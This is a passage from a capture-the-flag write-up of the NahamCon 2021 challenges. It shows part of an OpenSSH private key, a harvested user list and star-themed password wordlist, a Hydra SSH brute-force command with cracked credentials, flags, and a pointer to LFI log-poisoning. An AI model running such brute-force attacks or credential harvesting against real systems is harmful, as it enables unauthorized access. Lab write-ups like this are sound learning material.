wDiYLTjWt1q+au+u4a73yqnN3hhqQFDI3/u7P/gSOAGELgYGv1oq9mqumNovFgMNlT7/OW
y0ewpY888r6hz2/Ke1O92CELfiaa/Cx3G2pKIuyE3MlySxc8QKRdoG78NwGu1WFD3HLll0
NSWLRa8xNp0w6OCvsZjCPQ5zTVbcSjNfDnX73rOyaOn775U16HdTJq6qxX0TxVhfKscxPu
CNuKwpvmMLKI9ow71wkRLlk4LpQDg1GfPNRZPEjxhaFhMtfAAAAMEA+nET55rIfgZLk4ZM
+fbritSNf7Phvw5qUPQqdD62i6b09BtPJe695oayiPGCWfvJrZRDRm8LfMXKUKbmI/yyWb
yjgXcVueW05b1kLwtzqgkLin0mkIT4kv91cJdktGBIy4SLZ/CP/On7PRf0nf5ZdQH9jD10
hqMtD7WPfml8o2tqrnQYeq75AR8jIE9FaMRV8syL/QPilF+G0Z9oTK23MaKp2+52f0FKhR
txqeXgB1lAKb8SoN1tMTPg/waG/6bRAAAAwQDB6usb3IQ0elxDaMIXJUnn89FKAas72wSo
er8NIdtddJDO2eEgr63KHhJqQZTCSpis3HrYqsMejDjtrnnuxl1ixtxotp9Su0P9xZTx5J
N4pDw4dXtWkkK51QaoiKJqPPjXEXztCVbeASLrQews9g2tCSu74O+caikahpEnS9DNWvRA
5Ht/RiOzXVy/z8L5WDlP3Jok4n45PNf33Vc9S/rEHnYBAAOkvRZ3/8j8psFw+18YOgVTAb
yijZOk41Lh95EAAAAKam9obkB4cHMxNQE=
-----END OPENSSH PRIVATE KEY-----
```

#### Path to root flag?

`bank.c`: `https://github.com/gusrodry/development/blob/1257ad8850038d4f11acf807ac57d36b639a013a/bank.c`

### Lyra Patte - Marketing - Path5

`Twitter`: `https://twitter.com/LyraPatte`
`Twitter post with data leak`: `https://twitter.com/LyraPatte/status/1369086826263240704`
`Users/Passwords`: `https://constellations.page/constellations-documents/5/`
flag: `flag{bd869e6193c27308d2fd3ad4b427e8c3}`

#### Also found user list and passwords

```text
orion
pavo
gus
vela
hercules
leo
lyra
gemini
```

```text
flag{bd869e6193c27308d2fd3ad4b427e8c3}
starstar
allstars
starstruck
starshine
starsky
popstars
starship
bluestars
pinkstars
superstars
ilovestars
rockstars
thestars
starscream
gostars
shootingstars
northstars
alpinestars
starsign
moonandstars
starsrock
luckystars
iluvstars
fivestars
redstars
mystars
lovestars
dallasstars
moonstars
sunmoonstars
starsailor
silverstars
sevenstars
lilstars
dotaallstars
sunstars
starsun
starsstars
starsareblind
pokerstars
magicstars
divastars
blackstars
starstarstar
starsearch
luvstars
greenstars
deathstars
brightstars
twinstars
starsinthesky
starshooter
starsha
threestars
summerstars
starspirit
starshollow
starsandstripes
starsandmoons
nightstars
metrostars
icstars
hoodstars
deadstars
citystars
```

#### Crack login for pavo

```text
hydra -L users -P pass -s 31663 challenge.nahamcon.com -t 5 ssh
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-03-12 21:48:53
[DATA] max 10 tasks per 1 server, overall 10 tasks, 528 login tries (l:8/p:66), ~53 tries per task
[DATA] attacking ssh://challenge.nahamcon.com:31663/
[STATUS] 66.00 tries/min, 66 tries in 00:01h, 462 to do in 00:07h, 10 active
[31663][ssh] host: challenge.nahamcon.com   login: pavo   password: starsinthesky
```

#### login and get ~/flag.txt

`flag{cadbbfd75d2547700221f8c2588e026e}`

#### PHP LFI and FTP Log Poisoning

`PoC`: [RCE via LFI Log Poisoning - The Death Potion](https://shahjerry33.medium.com/rce-via-lfi-log-poisoning-the-death-potion-c0831cebc16d)
![log poisoning](https://imgur.com/a/gcXMev7)
`flag`: `flag{892427c840bdb0f4cf16af94b7312804}`
